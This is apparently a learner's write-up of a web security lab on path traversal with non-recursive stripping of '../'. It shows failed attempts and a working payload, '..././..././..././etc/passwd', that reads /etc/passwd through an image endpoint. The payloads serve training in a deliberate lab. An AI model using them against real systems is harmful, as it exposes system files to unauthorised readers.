Title: File path traversal, traversal sequences stripped non-recursively
Level: Practitioner
Desc:  This lab contains a path traversal vulnerability in the display of product images.
The application strips path traversal sequences from the user-supplied filename before using it.
To solve the lab, retrieve the contents of the /etc/passwd file. 

absolute path try: `/image?filename=/etc/passwd` - not working 
![image](https://github.com/user-attachments/assets/cc760812-85c5-4d02-9d2c-d342ab42d4fd)

relative path try: `/image?filename=../../../../../..//etc/passwd` - not working
![image](https://github.com/user-attachments/assets/7eaa4760-98f7-4b10-9357-eb354a7ee42e)

According to the "The application strips path traversal sequences from the user-supplied filename before using it.", I think, that the application deletes ../, but there shoud be possibility to add something like that
`..././`, so after deleting pattern `../` application get as follow: `../`, so we have path traversal sequence once again!

The only tick here is to find exact number of those sequences to get /etc/passwd file
![image](https://github.com/user-attachments/assets/ddffa7a5-df5b-47a6-9e50-20505922d765)

success payload: `/image?filename=..././..././..././etc/passwd`
